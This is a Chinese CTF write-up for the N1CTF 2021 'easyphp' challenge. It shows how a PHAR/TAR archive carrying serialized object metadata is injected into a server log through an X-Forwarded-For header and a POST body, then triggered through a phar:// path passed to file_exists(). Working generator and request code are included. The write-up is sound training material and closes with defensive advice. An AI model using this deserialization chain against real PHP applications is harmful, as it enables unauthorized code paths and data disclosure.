# N1CTF 2021 - easyphp

## 题目简述

应用会把请求时间、`X-Forwarded-For`、参数和原始 POST body 追加到按 IP 分类的日志文件；另一个可控参数会进入 `file_exists()`。服务端还定义了 `FLAG` 类，其析构函数输出私有 flag。目标是把一份带有 `FLAG` 元数据的 TAR 型 PHAR 精确拼进日志，再用 `phar://` 触发反序列化。

难点不只是生成恶意 PHAR，而是让服务端自动添加的日志前缀和后缀成为合法 TAR 数据的一部分，避免“脏字符”破坏归档格式。

## 解题过程

### 确认触发点

入口包含 `flag.php` 与 `log.php`，并对用户参数执行：

```php
if (file_exists(@$_GET["file"])) {
    echo "file exist!";
}
```

在受影响的 PHP/PHAR 行为中，文件函数访问 `phar://archive` 时会解析归档并反序列化元数据。服务端已经加载 `FLAG` 类，所以元数据中只需放一个该类对象；反序列化对象析构时会读取服务端类定义中的私有 `_flag` 并输出。

日志记录格式为：

```text
Time: YYYY-mm-dd HH:MM:SS IP: [<XFF>], REQUEST: [...], CONTENT: [<body>]
```

也就是说 body 前后不可避免地分别出现固定头和 `]\n`。

### 让日志本身成为 TAR/PHAR

TAR 的首个 512 字节块开头正是文件名字段。官方生成器预先计算与服务端完全一致的日志前缀，并把它直接用作 TAR 内部文件名：

```php
class FLAG {
    public function __destruct() {
        echo "FLAG: " . $this->_flag;
    }
}

$ip = "172.17.0.1";
$prefix = "Time: " . date("Y-m-d H:i:s")
        . " IP: [" . $ip . "], REQUEST: [], CONTENT: [";

$phar = new PharData(__DIR__ . "/phar.tar", 0, "phartest", Phar::TAR);
$phar->startBuffering();
$phar->setMetadata(new FLAG());
$phar->addFromString($prefix, "test");
$phar->stopBuffering();
file_put_contents("phar.tar", "]\n", FILE_APPEND);
```

生成的 `phar.tar` 已经以 `$prefix` 开头、以日志自动追加的 `]\n` 结尾。提交时去掉本地文件的前缀，只把余下字节作为 POST body：

```php
$archive = file_get_contents("phar.tar");
$body = substr($archive, strlen($prefix));
echo rawurlencode($body);
```

客户端固定 XFF，并尽快发送以保证本地与服务端时间戳处于同一秒：

```python
headers = {"X-Forwarded-For": "172.17.0.1"}
body = urllib.parse.unquote(run_php_generator())
requests.post(TARGET + "/", data=body, headers=headers)
```

若跨过秒边界，TAR 文件名与真实日志前缀不同，校验和也会失效，应重新生成并重试。

### 触发元数据反序列化

该请求会生成 `./log/172.17.0.1/look_www.log`。再访问：

```text
?log_type=test&file=phar://./log/172.17.0.1/look_www.log
```

`file_exists()` 解析日志中的 TAR/PHAR，反序列化 `FLAG` 元数据；请求结束时析构函数打印真实 flag。仓库只保存了官方生成器与请求脚本，没有保留比赛响应，因此本文不编造具体 flag。

## 方法总结

日志注入不一定要写入 PHP 代码，也可以写出结构化二进制容器。关键是把不可控前后缀纳入文件格式设计：这里让日志前缀成为 TAR 文件名，并让日志尾缀补齐预生成归档的结尾。防护上既要限制日志路径与 XFF，也不应把用户可控路径交给会触发 PHAR 解析的文件函数。
